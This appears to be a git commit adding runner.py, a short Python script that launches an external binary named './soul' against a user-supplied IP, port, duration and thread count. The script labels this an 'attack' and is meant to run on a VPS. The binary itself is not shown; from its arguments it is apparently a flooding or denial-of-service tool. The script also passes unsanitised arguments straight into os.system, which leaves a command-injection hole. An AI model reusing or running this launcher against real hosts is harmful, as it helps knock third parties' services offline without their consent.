ab782280ae9ef300b03108b450181bfde474c9b5
offxsahil <sahilshah786007@gmail.com>
2025-09-16 18:09:51 +0530

    Add files via upload

---
+++ runner.py
@@ -0,0 +1,30 @@
+# runner.py - Place this inside VPS under 'freeroot'
+
+import sys
+import os
+import threading
+import time
+
+# Argument validation
+if len(sys.argv) != 5:
+    print("Usage: python3 runner.py <ip> <port> <time> <threads>")
+    exit()
+
+# Parse arguments
+ip = sys.argv[1]
+port = sys.argv[2]
+attack_time = int(sys.argv[3])
+threads = sys.argv[4]
+
+# Attack function
+def run_attack():
+    os.system(f"./soul {ip} {port} {attack_time} {threads}")
+
+# Start attack in a daemon thread (will exit cleanly)
+attack_thread = threading.Thread(target=run_attack, daemon=True)
+attack_thread.start()
+
+# Sleep for duration then exit
+time.sleep(attack_time)
+print("Attack finished, exiting runner.py...")
+sys.exit(0)
